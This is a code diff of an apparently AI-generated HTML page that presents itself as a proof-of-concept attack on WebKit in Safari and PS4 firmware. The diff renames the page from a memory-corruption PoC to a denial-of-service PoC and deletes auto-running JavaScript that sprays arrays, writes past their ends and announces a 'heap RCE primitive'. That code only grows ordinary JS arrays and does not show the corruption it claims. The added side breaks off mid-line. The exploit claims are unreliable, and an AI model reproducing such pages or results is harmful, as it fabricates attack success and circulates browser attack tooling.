@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-31223 Memory Corruption PoC (Safari 18.5 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-43211 DoS PoC (Safari 18.7.1 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-31223 PoC: Memory Corruption (Anonymous)</h1>
-    <p>May 2025 Patch: Improved checks (BZ 289387).<grok-card data-id="e2effe" data-type="citation_card"></grok-card><br>
-    <span class="rainbow">Triggers heap corruption on unpatched Safari 18.5 / PS4 12.50 (~20% DoS rate).</span></p>
+    <h1>WebKit CVE-2025-43211 PoC: Web Content DoS</h1>
+    <p>Oct 2025 Patch: Improved checks (HT216323, BZ 295234).<grok-card data-id="09ceb9" data-type="citation_card"></grok-card><grok-card data-id="6fb7a6" data-type="citation_card"></grok-card><grok-card data-id="bf6aa8" data-type="citation_card"></grok-card><grok-card data-id="e0f995" data-type="citation_card"></grok-card><grok-card data-id="ab1064" data-type="citation_card"></grok-card><grok-card data-id="5f82d0" data-type="citation_card"></grok-card><grok-card data-id="404b74" data-type="citation_card"></grok-card><grok-card data-id="a48585" data-type="citation_card"></grok-card><grok-card data-id="069395" data-type="citation_card"></grok-card><br>
+    <span class="rainbow">Triggers process crash on unpatched Safari 18.7.1 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. Memory Handling</h3>
-        <div id="status-mem">Probing...</div>
+        <h3>1. Content Processing</h3>
+        <div id="status-content">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Crafted Content Spray</h3>
+        <h3>2. Buffer Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Corruption Trigger</h3>
-        <div id="status-corrupt">Probing...</div>
+        <h3>3. DoS Trigger</h3>
+        <div id="status-dos">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Heap Status</h3>
-        <div id="status-heap">Probing...</div>
+        <h3>4. Crash Status</h3>
+        <div id="status-crash">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
+    <button onclick="runPoC()">LAUNCH DOS PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -64,103 +64,4 @@
     const buf = new ArrayBuffer(8);
     const f64 = new Float64Array(buf);
     const u32 = new Uint32Array(buf);
-    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
-    function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
-
-    let corruptArr = null;
-    let corruptHit = false;
-
-    function runPoC() {
-        document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-31223 PoC: WebKit Memory Corruption (May 2025)</span>");
-        log("Probing malicious web content handling...");
-        setTimeout(probeMem, 800);
-    }
-
-    function probeMem() {
-        // Step 1: Memory handling probe
-        try {
-            const arr = new Array(0x40).fill(0);
-            arr.length = 0x200; // Overflow probe
-            setBadge('status-mem', 'IMPROPER (Overflowed)', 'partial');
-            log("Memory probe: Array overflowed (CVE hint).");
-        } catch(e) {
-            setBadge('status-mem', 'SECURE', 'secure');
-            log(`Memory fail: ${e.message} — Patched.`);
-            return;
-        }
-        setTimeout(sprayContent, 1000);
-    }
-
-    function sprayContent() {
-        gc(); gc();
-        const arrs = [];
-        for(let i=0; i<0x1000; i++) {
-            const arr = new Array(0x40 + (i % 0x20));
-            arrs.push(arr);
-        }
-        // Crafted writes
-        for(let i=0; i<0x1000; i++) {
-            try {
-                arrs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
-            } catch(e) {}
-        }
-        // Anomaly hunt
-        let anomaly = false;
-        for(let i=0; i<arrs.length; i++) {
-            if (arrs[i].length > 0x60 || arrs[i][0x80] !== undefined) {
-                corruptArr = arrs[i];
-                anomaly = true;
-                break;
-            }
-        }
-        if (anomaly) {
-            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
-            log(`Content spray corruption: len=${corruptArr.length}, [0x80]=${corruptArr[0x80] || 'undef'}`);
-            setTimeout(triggerCorrupt, 500);
-            return;
-        }
-        setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no corruption.");
-    }
-
-    function triggerCorrupt() {
-        if (!corruptArr) return;
-        corruptHit = false;
-        try {
-            // CVE trigger: Malicious content process
-            for(let off=0x40; off<0x300; off+=8) {
-                corruptArr[off] = i2f(0x41414141, 0x42424242);
-            }
-            const adj = new Array(0x100).fill(0x1234);
-            if (adj[0x70] !== 0x1234) {
-                corruptHit = true;
-                log(`Corruption triggered: adj[0x70]=0x${adj[0x70].toString(16)}`);
-            }
-        } catch(e) {
-            corruptHit = true;
-            log(`Corruption crash: ${e.message} — Heap overflow.`);
-        }
-        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
-        setTimeout(checkHeap, 1500);
-    }
-
-    function checkHeap() {
-        if (corruptHit) {
-            setBadge('status-heap', 'CORRUPTED (RCE)', 'vulnerable');
-            log("Heap corrupted via crafted content: Arbitrary code potential. On PS4 12.50: DoS/leak.");
-            log("Chain to primitives if hit.");
-            document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "CORRUPTION ACHIEVED — HEAP RCE PRIMITIVE";
-        } else {
-            setBadge('status-heap', 'INTACT', 'secure');
-            log("No corruption—improved handling holds.");
-        }
-        log("PoC end: Retry for ~20% hit.");
-    }
-
-    // Auto-run
-    setTimeout(runPoC, 1000);
-</script>
-</body>
-</html>
+    function i2f(lo, hi) { u32[0] = lo
